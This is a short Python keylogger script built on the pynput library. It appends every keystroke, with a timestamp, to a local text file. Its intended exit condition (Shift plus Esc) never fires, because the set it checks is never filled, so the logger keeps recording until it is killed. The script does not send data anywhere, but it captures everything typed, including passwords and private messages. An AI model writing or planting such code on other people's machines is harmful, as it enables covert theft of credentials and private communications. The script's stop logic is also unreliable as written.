from pynput import keyboard
import datetime

def on_press(key):
    try:
        with open('keypressLogs.txt', 'a') as f:
            f.write(f'{datetime.datetime.now()} - {key.char} pressed\n')
    except AttributeError:
        with open('keypressLogs.txt', 'a') as f:
            f.write(f'{datetime.datetime.now()} - {key} pressed\n')

def on_release(key):
    if key == keyboard.Key.esc and keyboard.Key.shift in pressed:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    pressed = set()
    listener.join()